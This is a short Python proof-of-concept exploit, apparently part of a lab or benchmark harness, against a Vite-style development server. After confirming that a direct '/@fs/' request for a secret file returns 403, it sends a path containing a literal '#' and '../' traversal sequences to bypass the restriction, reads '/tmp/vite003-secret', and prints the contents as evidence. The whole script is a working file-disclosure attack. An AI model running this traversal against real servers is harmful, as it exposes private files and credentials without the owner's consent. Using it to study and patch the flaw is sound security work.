#!/usr/bin/env python3
"""Read a private file with a literal hash in the HTTP request target."""

import http.client
import json
import os
import urllib.parse


FLAG_PATH = "/tmp/vite003-secret"
DIRECT_PATH = "/@fs/tmp/vite003-secret"
HASH_PATH = "/@fs/app/#/../../../tmp/vite003-secret"


def request_target(target_url: str, path: str) -> tuple[int, str]:
    parsed = urllib.parse.urlsplit(target_url)
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError("target URL must be HTTP with a hostname")
    connection = http.client.HTTPConnection(parsed.hostname, parsed.port or 80, timeout=30)
    try:
        connection.request("GET", path)
        response = connection.getresponse()
        return response.status, response.read().decode("utf-8")
    finally:
        connection.close()


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    direct_status, _ = request_target(target_url, DIRECT_PATH)
    if direct_status != 403:
        raise RuntimeError(f"direct private file request returned HTTP {direct_status}")

    hash_status, content = request_target(target_url, HASH_PATH)
    if hash_status != 200:
        raise RuntimeError(f"hash request returned HTTP {hash_status}")

    print(json.dumps({
        "evidence_payload": {"flag_path": FLAG_PATH, "content": content},
        "direct_status": direct_status,
        "hash_status": hash_status,
        "request_target": HASH_PATH,
    }))


if __name__ == "__main__":
    main()
